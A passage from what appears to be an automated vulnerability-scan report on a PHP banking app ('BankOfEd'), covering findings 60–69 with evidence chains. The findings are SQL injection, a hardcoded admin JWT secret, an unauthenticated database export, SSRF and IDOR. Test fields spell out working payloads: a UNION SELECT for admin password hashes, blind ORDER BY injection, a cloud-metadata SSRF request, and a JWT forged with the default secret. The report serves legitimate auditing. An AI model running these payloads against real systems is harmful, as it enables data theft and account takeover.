$context = stream_context_create(['http' => ['timeout' => 5, 'follow_location' => true]]);
$content = @file_get_contents($data['url'], false, $context);
...
Response::success([
    'avatar_data' => "data:{$mime};base64,{$encoded}",
    'size'        => strlen($content),
    'source_url'  => $data['url'],
]);
```

## 60. SQL Injection in admin customer search (AdminUserController::index)

- Lead reference: PWNJ-060
- Category: A03
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:22-33
- Fingerprint: 7b8d54b5961b0f2f4683dd4805ab082e7ec633fb429c862099714f64bda78665

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 17,
  "symbol": "$_GET['search']",
  "input": "HTTP query parameter"
}
```

#### Controls encountered

```
[
  "[\"Endpoint requires valid admin auth (AdminAuthMiddleware::handle()) to reach the handler, limiting external anonymous exploitation but not mitigating the injection itself once authenticated\", \"int casts are applied to $page/$perPage/$offset (safe), but NOT to $search\"]\n<parameter name=\"counterevidence\">[]"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 28,
  "symbol": "$db->query($countSql)",
  "operation": "raw SQL execution"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Exact DB privileges of 'bankofed_admin' user not confirmed from code alone, though UNION-based data exfiltration from the same schema (admin_users, users, accounts, transactions tables) is trivially achievable regardless of privilege level since the app already queries those tables with this same connection"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated admin (or reachable actor)",
    "GET /api/admin/customers?search=<payload>",
    "AdminUserController::index() interpolates search into COUNT and SELECT SQL without binding",
    "$db->query() executes with elevated DB privileges",
    "Arbitrary table read / potential write depending on privileges"
  ],
  "impact": "SQL injection executed with the elevated 'bankofed_admin' DB user, allowing reading arbitrary tables including admin password hashes and all customer PII/balances.",
  "severity_reasoning": "High: unparameterized SQLi with elevated DB privileges is a critical database-compromise vector.",
  "dynamic_test": "GET /api/admin/customers?search=%25' UNION SELECT username,password_hash,3,4,5,6,7 FROM admin_users -- with admin auth; confirm injected rows in the response, proving SQLi executed with elevated DB privileges."
}
```

#### Validator reasoning

The code at AdminUserController::index reads $_GET['search'] directly into $search with no sanitization, then interpolates it verbatim into a WHERE clause string via double-quoted string interpolation: `\"WHERE first_name LIKE '%{$search}%' OR ...\"`. This string is concatenated into both $countSql and $sql, which are executed via $db->query() (PDO::query()), not PDO::prepare()/execute() with bound parameters. PDO::query() performs no parameter binding or escaping of the raw SQL string it is given, so any single quote or other SQL metacharacter in $search is passed straight to the MySQL server. Verified via AdminDatabase::getInstance(): the PDO connection is a stock unmodified PDO instance (with EMULATE_PREPARES=false, but that only affects prepare()-issued statements, not raw query() calls, which are unaffected by that flag). There is no addslashes/escaping/whitelist/regex validation applied to $search anywhere in this file or in any middleware in the request path. AdminRouter.php shows the route 'GET /api/admin/customers' is dispatched to AdminUserController::index with auth=>true, which runs AdminAuthMiddleware::handle() for authentication/authorization, but that middleware validates the JWT/session — it does not sanitize query parameters. No WAF or parameter-binding layer sits between $_GET and the query() call. This is a textbook classic SQL injection: an attacker-controlled string reaches a raw SQL execution sink unsanitized and unparameterized, over an HTTP-reachable endpoint, gated only by admin authentication (which does not mitigate SQLi — it only limits the population of possible attackers to authenticated admins, still a valid vulnerability/privilege-escalation and lateral-movement vector). This is a genuine, concrete, exploitable source-to-sink path with no effective blocking control.

#### Code evidence

```
if ($search !== '') {
    $where = "WHERE first_name LIKE '%{$search}%' OR last_name LIKE '%{$search}%' OR email LIKE '%{$search}%'";
}
$countSql = "SELECT COUNT(*) FROM users {$where}";
$stmt = $db->query($countSql);
...
$sql = "SELECT id, email, first_name, last_name, phone, totp_enabled, created_at FROM users {$where} ORDER BY id DESC LIMIT {$perPage} OFFSET {$offset}";
$stmt = $db->query($sql);
```

## 61. Hardcoded fallback JWT secret for admin panel authentication

- Lead reference: PWNJ-061
- Category: A02
- Severity: MEDIUM
- Confidence: 78%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/admin.php:20 and BankOfEd-main/src/Controllers/AdminAuthController.php:38-44
- Fingerprint: e2f8b3074f354892d8218463a9c113310a1bda5eaacf255707c026e955632c9c

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/config/admin.php",
  "line": 20,
  "symbol": "jwt_secret fallback",
  "input": "missing environment variable"
}
```

#### Controls encountered

```
[
  "deploy.sh's fresh-install path auto-generates a random ADMIN_JWT_SECRET via generate_secret() and writes it to .env, which would prevent this issue for deployments using that exact script from scratch",
  "AdminAuthMiddleware does check token issuer, revocation list, and admin existence in DB after signature verification, but these checks are irrelevant if the attacker can already forge a validly-signed token with arbitrary claims"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminAuthController.php",
  "line": 44,
  "symbol": "JWT::encode",
  "operation": "token signing with weak secret"
}
```

#### Counterevidence

```
[
  "deploy.sh demonstrates the project authors are aware of the need for a strong secret and provide one automated path that mitigates the issue when followed exactly",
  "No live-environment confirmation that ADMIN_JWT_SECRET is actually unset in the specific production deployment being assessed"
]
```

#### Proof gaps

```
[
  "Whether the actual target deployment sets ADMIN_JWT_SECRET (via deploy.sh or manually) cannot be verified from source code alone; if always set to a strong random value, exploitability drops to zero",
  "No verification that deploy.sh's 'existing .env' reuse branch (which does not validate ADMIN_JWT_SECRET presence) is not the typical operational path in practice"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker with source/.env.example knowledge",
    "config/admin.php jwt_secret fallback default",
    "AdminAuthController::login()/AdminAuthMiddleware use same default secret",
    "Attacker forges admin JWT with default secret",
    "Full administrative access (fund/balance manipulation, customer data, DB reset)"
  ],
  "impact": "Hardcoded fallback admin JWT secret enables forging admin sessions, granting full administrative access if ADMIN_JWT_SECRET is never overridden.",
  "severity_reasoning": "Medium: real-world exploitation contingent on operator misconfiguration, but consequence is total admin compromise.",
  "dynamic_test": "On unrotated deployment, sign admin JWT with 'bankofed-admin-secret-change-in-production' and call an admin API to confirm access."
}
```

#### Validator reasoning

The vulnerability is real and verified in the application source. config/admin.php:20 defines 'jwt_secret' => getenv('ADMIN_JWT_SECRET') ?: 'bankofed-admin-secret-change-in-production' — a hardcoded fallback that is byte-for-byte identical to the placeholder shipped in .env.example (line 12: ADMIN_JWT_SECRET=bankofed-admin-secret-change-in-production). This config array is loaded and used in two security-critical places: AdminAuthController::login() (line 44) signs new admin JWTs with $config['jwt_secret'], and AdminAuthMiddleware::handle() (line 27) verifies incoming Bearer tokens against the very same $config['jwt_secret'] using HS256 (symmetric signing — the secret used to verify is the same one needed to forge). If ADMIN_JWT_SECRET is unset in the runtime environment, both code paths silently fall back to the publicly-known string. An attacker who knows this default (trivial - it's in .env.example, presumably in any public repo/docs) can construct an arbitrary payload (sub=<admin id>, iss='BankOfEdAdmin', jti=random, exp=future) and sign a valid HS256 JWT locally with the known secret, then present it as Bearer token to any admin-authenticated endpoint, bypassing AdminAuthMiddleware's signature check entirely and gaining full admin privileges without valid credentials. This is a genuine source-to-sink path: the "source" (missing env var) flows directly and unconditionally into the signing/verification secret with no other gating logic in between.

I did find one deployment script, deploy.sh, whose "fresh install" branch calls generate_secret to produce a random ADMIN_JWT_SECRET and writes it to .env — this is a mitigating control for that one specific fresh-install path. However: (1) this is only one of potentially several ways to deploy the app; (2) deploy.sh's "reuse existing .env" branch does not verify ADMIN_JWT_SECRET is present/non-default in an existing .env file; (3) manual deployments, Docker-based deployments, or any process not going through this exact script would never set the variable and silently get the hardcoded default; (4) the vulnerable fallback exists unconditionally in the application code itself, which is the artifact being scanned — the deploy script is deployment-tooling, not the application's authentication logic. The core weakness (a hardcoded, publicly-disclosed default secret used for cryptographic signing/verification of privileged admin sessions, with no runtime warning/rejection when the env var is absent) is a legitimate, exploitable weakness in the reviewed codebase.

#### Code evidence

```
// config/admin.php
'jwt_secret'    => getenv('ADMIN_JWT_SECRET') ?: 'bankofed-admin-secret-change-in-production',

// AdminAuthController.php login()
$token = JWT::encode($payload, $config['jwt_secret'], $config['jwt_algorithm']);

// AdminAuthMiddleware.php
$payload = JWT::decode($token, new Key($config['jwt_secret'], $config['jwt_algorithm']));
```

## 62. Unauthenticated full database export endpoint discloses all users, accounts, and transactions

- Lead reference: PWNJ-062
- Category: API1
- Severity: HIGH
- Confidence: 98%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/AdminRouter.php:48 and BankOfEd-main/src/Controllers/AdminUserController.php:171-183
- Fingerprint: d24f8e04701a05dd4f0e7c190ae3e1d598e05dba1ecc97368075dff8890fa9e5

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/AdminRouter.php",
  "input": "unauthenticated HTTP request",
  "line": 48,
  "symbol": "GET /api/admin/export/users"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/AdminUserController.php",
  "line": 173,
  "operation": "unauthenticated bulk data export",
  "symbol": "$db->query('SELECT * FROM users')"
}
```

#### Counterevidence

```
[
  "None found; no IP allow-list, shared secret, environment check, or middleware guards this route anywhere in AdminRouter.php or public/index.php."
]
```

#### Proof gaps

```
[
  "Could not confirm from static review alone whether this endpoint is blocked at a network/infrastructure layer (e.g., firewall, reverse proxy rule) outside the application code, though no such control is evidenced in the repository."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated caller",
    "GET /api/admin/export/users (registered with auth=false, unlike every other admin route)",
    "AdminAuthMiddleware never invoked",
    "AdminUserController::exportAll() runs SELECT * FROM users/accounts/transactions",
    "Full result sets (incl. password_hash) returned as JSON"
  ],
  "impact": "Unauthenticated mass exposure of the entire bank's customer PII, financial data, and password hashes, since AdminAuthMiddleware is entirely bypassed for this route.",
  "severity_reasoning": "High: complete unauthenticated exfiltration of the customer database, broken authentication for a highly sensitive endpoint.",
  "dynamic_test": "curl -s https://target/api/admin/export/users with no bearer token/session cookie; confirm full users/accounts/transactions JSON returned including password_hash."
}
```

#### Validator reasoning

The finding is fully substantiated by direct code inspection. In AdminRouter.php, the route `/api/admin/export/users` is registered with `'auth' => false`, unlike every sibling admin route in the same file (all others use `'auth' => true`). In the dispatch loop, `$requiresAuth = $route['auth'];` and `AdminAuthMiddleware::handle()` is only invoked `if ($requiresAuth)`. Since this route sets auth to false, the middleware is skipped entirely and the handler is invoked with no auth argument (`call_user_func_array($handler, $args)` with empty $args, matching the handler signature `exportAll(): void` which takes no parameters, confirming this is the intended no-auth path, not a bug in argument-passing that would throw an error). The handler `AdminUserController::exportAll()` unconditionally executes `SELECT * FROM users`, `SELECT * FROM accounts`, and `SELECT * FROM transactions ORDER BY created_at DESC`, and returns all rows verbatim via `Response::success()` as JSON, with no filtering of sensitive fields (unlike `show()`/`index()` in the same controller, which selectively project columns and exclude password_hash). The front controller (public/index.php) routes any URI starting with `/api/admin/` to `AdminRouter::dispatch()` with no other authentication/IP gate before reaching the dispatcher. There is no secondary check (no IP allowlist, no shared secret header check, no environment check) anywhere in this path. This is a genuine, directly reachable unauthenticated mass-data-exposure vulnerability: any unauthenticated actor sending `GET /api/admin/export/users` receives the full users table (including password_hash and PII), full accounts table (balances, BSB, account numbers), and full transactions table.

#### Code evidence

```
// AdminRouter.php
$r->addRoute('GET', '/api/admin/export/users', ['handler' => [AdminUserController::class, 'exportAll'], 'auth' => false]);

// AdminUserController.php
public static function exportAll(): void
{
    $db = AdminDatabase::getInstance();
    $stmt = $db->query('SELECT * FROM users');
    $users = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM accounts');
    $accounts = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM transactions ORDER BY created_at DESC');
    $transactions = $stmt->fetchAll();
    Response::success(['users' => $users, 'accounts' => $accounts, 'transactions' => $transactions]);
}
```

## 63. SQL injection via unvalidated 'sort' GET parameter in Transaction::findByUser (ORDER BY clause)

- Lead reference: PWNJ-063
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:44
- Fingerprint: 0c5120840638b04b6c03e7d1a9dd96e63459484faf77f539696ed27ec35e2034

### Evidence Chain

#### Source

```
BankOfEd-main/src/Models/Transaction.php:44
```

#### Controls encountered

```
[
  "Positional (?) placeholder binding is correctly used for accountId, userId, perPage, and offset values",
  "Route presumably requires authentication (auth array is passed in), but authentication does not mitigate SQL injection since any authenticated user can supply the sort parameter"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No counterevidence found; no whitelist, casting, or escaping of $sort exists in Controller or Model",
  "$sort is typed as PHP string type-hint only, which does not constrain its content to a safe column name"
]
```

#### Proof gaps

```
[
  "Runtime confirmation of exact MySQL error verbosity/blind exploitation reliability was not performed (out of scope for static review)",
  "Not verified whether an upstream WAF exists in deployment, though this would not be a code-level mitigating control"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user",
    "GET /api/transactions?sort=<payload>&account_id=<own account>",
    "TransactionController::index() passes unchecked $_GET['sort']",
    "Transaction::findByUser() interpolates sort into 'ORDER BY t.{$sort} DESC' (accountId branch)",
    "PDO prepare/execute binds only other params; injected SQL text executes unmodified",
    "Blind/boolean SQLi against transactions table or broader DB"
  ],
  "impact": "Authenticated user can inject SQL via the sort parameter into the ORDER BY clause, enabling blind extraction of data from other tables (e.g. users.password_hash, admin_users).",
  "severity_reasoning": "High: genuine SQL injection sink reachable by any authenticated customer via a common sort parameter.",
  "dynamic_test": "GET /api/transactions?sort=(SELECT CASE WHEN (1=1) THEN created_at ELSE 1/0 END) vs a false-condition equivalent as an authenticated user; compare success/error responses to confirm boolean-blind SQLi in the ORDER BY clause."
}
```

#### Validator reasoning

Verified the full source-to-sink path. In TransactionController::index (line 19), `$sort = $_GET['sort'] ?? 'created_at';` reads directly from the query string with zero validation, filtering, or whitelist check anywhere in the method. It is passed unmodified to Transaction::findByUser($userId, $page, $perPage, $accountId, $sort) at line 29. Inside Transaction::findByUser (Models/Transaction.php), the parameter is typed as `string $sort` (no enum/whitelist constraint), and is interpolated directly into the raw SQL text via double-quoted string interpolation in both branches: `"... ORDER BY t.{$sort} DESC ..."` (lines 44 and 59). This happens before $db->prepare() builds the statement, meaning the injected content becomes part of the literal SQL text sent to the database — not a bound parameter. The subsequent $stmt->execute([...]) calls only bind accountId/userId/perPage/offset; $sort is never among the bound values. Since $sort is a string, an attacker can supply e.g. `?sort=1;--` or subquery/CASE-based payloads to break out of the intended identifier position and inject arbitrary SQL, enabling boolean-based/blind extraction or DB errors that leak schema info. No sanitization, escaping, is_numeric check, or whitelist mapping (e.g., a column-name allowlist array) exists anywhere in the call chain from the GET parameter to the SQL string construction. This is a textbook second-order SQL injection via ORDER BY clause.

## 64. SQL injection via unvalidated 'sort' GET parameter in Transaction::findByUser (no accountId branch)

- Lead reference: PWNJ-064
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:59
- Fingerprint: 7a7b1e39782befd1882edec387f2a5a52a20a74834777ea250b462b97ab5e238

### Evidence Chain

#### Source

```
BankOfEd-main/src/Models/Transaction.php:59
```

#### Controls encountered

```
[
  "Positional parameter binding exists for userId/perPage/offset but does not cover $sort",
  "No whitelist/regex validation of $sort value observed in TransactionController or Transaction model"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "None found blocking exploitation: no input filtering layer, no framework-level parameter sanitization for GET params in this codebase (Router.php dispatches to controller directly), no WAF or middleware visible in code"
]
```

#### Proof gaps

```
[
  "Exact DB error-based or blind exploitation technique (e.g., whether MySQL error messages are surfaced to the client) not confirmed, but this affects exploitation convenience, not the existence of the injection primitive itself",
  "Runtime behavior of PDO in this codebase's Database::getInstance() (e.g., emulated prepares on/off) not verified, though irrelevant here since the injection occurs in the raw SQL string prior to prepare(), not via bound parameters"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user",
    "GET /api/transactions?sort=<payload> (no account_id)",
    "TransactionController::index()",
    "Transaction::findByUser() else-branch: 'ORDER BY t.{$sort} DESC' joined with accounts table",
    "Injected SQL executes; bound params ($userId,$perPage,$offset) don't mitigate",
    "Blind SQLi extraction"
  ],
  "impact": "Second reachable SQLi sink for the same tainted 'sort' parameter when no account_id filter is supplied, enabling boolean/time-based data extraction.",
  "severity_reasoning": "High: duplicate sink of the same root cause, independently reachable and exploitable.",
  "dynamic_test": "GET /api/transactions?sort=<payload> without account_id filter as authenticated user; compare true/false condition responses to confirm SQLi in the no-accountId branch's ORDER BY clause."
}
```

#### Validator reasoning

Traced full source-to-sink path: TransactionController::index() reads `$sort = $_GET['sort'] ?? 'created_at';` with zero validation/whitelisting, then passes it to Transaction::findByUser($userId, $page, $perPage, $accountId, $sort). Inside findByUser, when $accountId is null (i.e., the request omits account_id), the else branch builds:
"SELECT t.* FROM transactions t JOIN accounts a ON t.from_account_id = a.id WHERE a.user_id = ? ORDER BY t.{$sort} DESC LIMIT ? OFFSET ?"
via direct string interpolation of $sort into the SQL text, then prepares/executes with only $userId, $perPage, $offset bound as parameters. The $sort value itself is never parameterized or validated against an allowed column list, so it lands verbatim in the ORDER BY clause of the prepared statement's SQL text before compilation — parameter binding cannot mitigate injection already baked into the query string.

The route is registered as `GET /api/transactions` requiring only `auth => true` (any authenticated user), and account_id is optional (`$accountId = isset($_GET['account_id']) ? (int)$_GET['account_id'] : null;`), so simply omitting account_id from the query string routes execution into the vulnerable else-branch containing this second sink. This is a genuine, independently reachable second injection point sharing the same root cause and unsanitized input as the sibling accountId-branch finding.

No mitigating control exists: no allow-list mapping of sort values to column names, no regex/ctype validation, no escaping, and PDO parameter binding does not apply to values interpolated directly into SQL text before prepare(). This matches classic PHP PDO ORDER BY injection pattern.

## 65. SQL injection in admin customer search via unsanitized LIKE interpolation

- Lead reference: PWNJ-065
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:22
- Fingerprint: 4f7d652d9fea8ce8ce692801150a7edaff9d56ff61986db7cea732e00096e6e4

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/AdminUserController.php:22
```

#### Controls encountered

```
[
  "Route requires 'auth' => true, meaning AdminAuthMiddleware must authenticate the caller as an admin before reaching the handler — this raises the bar to 'authenticated admin or hijacked admin session' but does not neutralize the SQL injection itself",
  "PDO::ATTR_EMULATE_PREPARES => false is set on the connection, but this only affects true prepare()/bindParam() flows, not raw ->query() calls with fully interpolated strings, so it provides no protection for this sink"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No parameterization, escaping, whitelisting, or input validation of $search was found anywhere in the file or in Validator helper usage for this endpoint",
  "The perPage/offset variables are cast to int before interpolation (safe), highlighting that $search specifically lacks the same treatment, showing this is an inconsistency/oversight rather than an intentional safe design"
]
```

#### Proof gaps

```
[
  "Did not verify AdminAuthMiddleware internals to fully characterize the strength of the auth gate (e.g., whether session tokens could be trivially forged elsewhere in the app), but this does not affect the core SQLi finding since even legitimate authenticated admins can trigger the injection",
  "Did not confirm live DB error-reporting behavior (mysql exceptions) that would determine ease of blind vs. error-based exploitation, though this only affects exploitation technique, not exploitability itself"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated admin (or reachable caller)",
    "GET /api/admin/customers?search=<payload>",
    "AdminUserController::index() builds WHERE with raw string interpolation",
    "$db->query($countSql)/$db->query($sql) executes unsanitized SQL",
    "Data exfiltration via UNION/blind techniques"
  ],
  "impact": "Unsanitized interpolation of the search parameter into a LIKE clause allows arbitrary SQL injection, exfiltrating admin_users password hashes or other sensitive tables.",
  "severity_reasoning": "High: same critical unparameterized SQLi as other AdminUserController::index duplicates.",
  "dynamic_test": "GET /api/admin/customers?search=%' OR 1=1 UNION SELECT ... -- with admin session; confirm arbitrary rows/columns returned proving injection."
}
```

#### Validator reasoning

The code in AdminUserController::index() (BankOfEd-main/src/Controllers/AdminUserController.php:22) takes $_GET['search'] directly and interpolates it, unescaped and unparameterized, into a raw SQL WHERE clause string ("WHERE first_name LIKE '%{$search}%' OR ..."), which is then executed via $db->query($countSql) and $db->query($sql) rather than a prepared statement with bound parameters. AdminDatabase::getInstance() returns a plain PDO connection with PDO::ATTR_EMULATE_PREPARES => false — this setting affects only real prepare()/execute() calls, not raw query() calls, so it provides no protection here; $db->query() executes the fully-interpolated string as-is with no escaping layer. No input validation, whitelisting, or escaping (e.g., addslashes, PDO::quote) is applied to $search anywhere before interpolation. The route GET /api/admin/customers is registered with 'auth' => true in AdminRouter.php, meaning AdminAuthMiddleware::handle() must succeed before the handler runs, but this only requires a valid admin session/token — it does not prevent an authenticated (or otherwise authorized) admin user (or any actor with a stolen/forged admin session) from injecting SQL via the search parameter. Since admin authentication is a very common target in real attacks (session fixation, stolen cookies, insider misuse, secondary injection after another admin vuln) and the query itself touches the users table (potentially joinable to admin_users or other sensitive tables via UNION), this is a real, exploitable classic SQL injection with a single quote breakout in the LIKE clause (e.g., search=%' OR 1=1 UNION SELECT ... --). This matches the confirmed vulnerability pattern with a clear source (unsanitized GET param) to sink (raw SQL query execution) and no effective mitigating control in between.

## 66. SQL injection via unsanitized `sort` parameter in transaction listing ORDER BY clause

- Lead reference: PWNJ-066
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Transaction.php:44
- Fingerprint: 640e573d7bb532700c9eae95b8f283bd9de73e2fe57f5868be16f0e9b0c33c5e

### Evidence Chain

#### Source

```
BankOfEd-main/src/Models/Transaction.php:44
```

#### Controls encountered

```
[
  "Route requires authentication (auth=true) but does not restrict which authenticated users can supply the parameter, and authentication does not mitigate SQL injection risk",
  "PDO prepared statements are used for the WHERE/LIMIT/OFFSET bound parameters, but $sort is not one of the bound parameters"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not verify at runtime whether MySQL strict mode or column-name mismatch would throw a fatal on malformed injected SQL before data exfiltration occurs, though this only affects exploitation technique (error-based/blind) not exploitability itself"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user",
    "GET /api/transactions?sort=<payload>",
    "TransactionController::index() no whitelist on $_GET['sort']",
    "Transaction::findByUser() interpolates into ORDER BY clause of PDO-prepared SQL text",
    "Boolean/error/time-based blind SQLi executed"
  ],
  "impact": "SQL injection via unvalidated sort parameter permits blind extraction of data such as users.password_hash or admin_users records.",
  "severity_reasoning": "High: duplicate of the sort-parameter SQLi finding, directly exploitable by any authenticated customer.",
  "dynamic_test": "GET /api/transactions?sort=(SELECT CASE WHEN (1=1) THEN created_at ELSE id END) as authenticated user; observe behavior differs from a false-condition payload, confirming injection into the ORDER BY clause."
}
```

#### Validator reasoning

Traced full source-to-sink path: TransactionController::index() (BankOfEd-main/src/Controllers/TransactionController.php:19) reads `$sort = $_GET['sort'] ?? 'created_at';` with zero validation/whitelisting, then passes it unmodified into Transaction::findByUser($userId, $page, $perPage, $accountId, $sort). Inside Transaction.php (both the accountId branch, line ~44, and the no-accountId branch, line ~58), the value is interpolated directly into the SQL string via `"... ORDER BY t.{$sort} DESC ..."` before the string is handed to $db->prepare(). Because $sort is embedded in the literal SQL text (not bound as a `?` placeholder), PDO parameter binding provides no protection regardless of PDO::ATTR_EMULATE_PREPARES setting — that flag only affects how bound parameters are escaped/sent, and $sort is never a bound parameter here. The route `/api/transactions` (Router.php line 79) only requires `auth => true` (i.e., any authenticated user, no additional role check), so any logged-in user can reach this sink with attacker-controlled input, e.g. `GET /api/transactions?sort=(SELECT...)` or stacked/derived subqueries usable for boolean/error/time-based blind SQLi. There is no Validator::make call, regex, or enum/whitelist check on `sort` anywhere in the controller or model. This is a textbook classic SQL injection via unsanitized identifier/expression interpolation into ORDER BY.

## 67. Unauthenticated admin data export exposes all users, accounts, and transactions

- Lead reference: PWNJ-067
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/AdminUserController.php:174
- Fingerprint: a85877df741adea257d8fc70f47b5b8b6b7d58f01978f0c1a9fc45df72c0bfbb

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/AdminUserController.php:174
```

#### Controls encountered

```
[
  "None effective: 'auth' => false explicitly disables the AdminAuthMiddleware call path for this specific route in AdminRouter::dispatch",
  "CorsMiddleware::handle() runs but only sets CORS headers, not an authorization control"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No counterevidence found; route registration, dispatch logic, and handler implementation all corroborate the claim with no mitigating auth/authorization check anywhere in the path"
]
```

#### Proof gaps

```
[
  "Did not verify the exact columns of the users/accounts tables via the schema file to confirm password_hash/totp_secret/card_cvv column names, but this does not affect the core finding that the entire tables are dumped unauthenticated"
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated caller",
    "GET /api/admin/export/users ('auth'=>false in AdminRouter, bypassing AdminAuthMiddleware)",
    "AdminUserController::exportAll() runs SELECT * on users, accounts, transactions",
    "Complete dataset (incl. card_number, card_cvv, password_hash, totp_secret) returned"
  ],
  "impact": "Full unauthenticated dump of PII, credentials, TOTP secrets, and card data for every customer.",
  "severity_reasoning": "High: exceptionally sensitive card and credential data exposed with zero authentication.",
  "dynamic_test": "curl -s https://target/api/admin/export/users with no Authorization header; confirm response includes card_number/card_cvv/credit_limit fields for accounts and password_hash/totp_secret for users."
}
```

#### Validator reasoning

Verified end-to-end. public/index.php routes any request under /api/admin/ to AdminRouter::dispatch() with no upstream authentication check. AdminRouter.php explicitly registers GET /api/admin/export/users with 'auth' => false, and the dispatch loop only invokes AdminAuthMiddleware::handle() when $route['auth'] is truthy — so for this route $auth stays null and AdminAuthMiddleware is never called. The handler AdminUserController::exportAll() takes no $auth/$vars parameters, performs no authorization or session check of its own, and unconditionally runs 'SELECT * FROM users', 'SELECT * FROM accounts', and 'SELECT * FROM transactions ORDER BY created_at DESC', returning the full result sets (including password_hash/totp_secret from users and card_number/card_cvv/credit_limit/balances from accounts, per the schema referenced in the description) via Response::success(). There is no other gate (no IP allowlist, no internal-only check, no feature flag) between the public entry point and this handler. This is a clean, concretely reachable, unauthenticated full-database-dump vulnerability exactly as described.

## 68. SSRF via unrestricted user-supplied URL in avatar proxy

- Lead reference: PWNJ-068
- Category: A10
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:71
- Fingerprint: 9cea7d0b3ade5d92dce4ada9b32052fcc89556b7ce046ed286ad468542aff02b

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/ProfileController.php:71
```

#### Controls encountered

```
[
  "Route requires 'auth' => true (any authenticated user can call it, not a real barrier against SSRF since it's still attacker-controlled input from a logitimate account)"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No allow-list, scheme restriction, or private-IP filtering was found in the reviewed file or router configuration; no compensating control observed."
]
```

#### Proof gaps

```
[
  "Did not verify whether an external WAF, egress firewall, or network segmentation exists outside the source tree that might mitigate real-world exploitability; source-level review shows no application-layer control regardless."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user",
    "POST /api/profile/avatar {url:<internal target>}",
    "ProfileController::avatarProxy() file_get_contents() with follow_location, no allow-list",
    "Server requests internal/metadata/insurance-service endpoint",
    "Response reflected back to caller (content + mime), or used as SSRF oracle"
  ],
  "impact": "Authenticated user can pivot the server to make arbitrary outbound requests against internal services (e.g. cloud metadata, the FACE insurance backend), potentially disclosing secrets and enabling further internal exploitation.",
  "severity_reasoning": "High: SSRF against internal infrastructure with response reflection, serious lateral-movement risk.",
  "dynamic_test": "POST /api/profile/avatar {\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"} or {\"url\":\"http://localhost:8001/\"} (the FACE insurance service); inspect response for evidence of internal content fetched."
}
```

#### Validator reasoning

The code at ProfileController::avatarProxy() (lines 63-108) takes `data['url']` directly from the authenticated user's JSON POST body with only an empty-check (`empty($data['url'])`), then passes it unmodified to `file_get_contents($data['url'], false, $context)` where `$context` sets `follow_location => true`. There is no scheme allow-list (http/https only), no DNS/IP validation to block loopback/link-local/private ranges (127.0.0.1, 169.254.169.254 metadata endpoint, internal 10.x/172.16.x/192.168.x, or the referenced localhost:8001 FACE service), and no blocking of dangerous wrappers such as file://, gopher://, phar://, etc. PHP's file_get_contents supports all registered stream wrappers, so file:// and gopher:// would work for local file disclosure / protocol smuggling respectively. The route is registered in Router.php as `POST /api/profile/avatar` with only `'auth' => true`, meaning any authenticated user (no elevated privilege required) can reach this sink directly — confirmed via grep of Router.php line 51. After the fetch, the response body is base64-encoded and returned via `Response::success` along with a MIME type parsed directly from the response's `Content-Type` header (also attacker-influenced if the attacker controls the target server), giving a full (non-blind) SSRF oracle: attacker gets back the actual bytes and headers of the internal resource. There's no compensating network-layer control visible in the reviewed code, and no evidence of an egress filter, DNS-rebind protection, or private-IP check anywhere in this file or upstream (Router.php just checks auth). This matches the classic unrestricted-URL SSRF pattern with a concrete, reachable source-to-sink path.

## 69. IDOR: any authenticated user can view any transaction by ID

- Lead reference: PWNJ-069
- Category: A01
- Severity: MEDIUM
- Confidence: 94%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/TransactionController.php:39
- Fingerprint: 5b807936585c67d622562f9d48e4a1aea83a9e1350b958d4a76b0edefcddc3de

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/TransactionController.php:39
```

#### Controls encountered

```
[
  "AuthMiddleware::handle() enforces that a valid JWT/session exists (authentication only, not authorization/ownership)"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
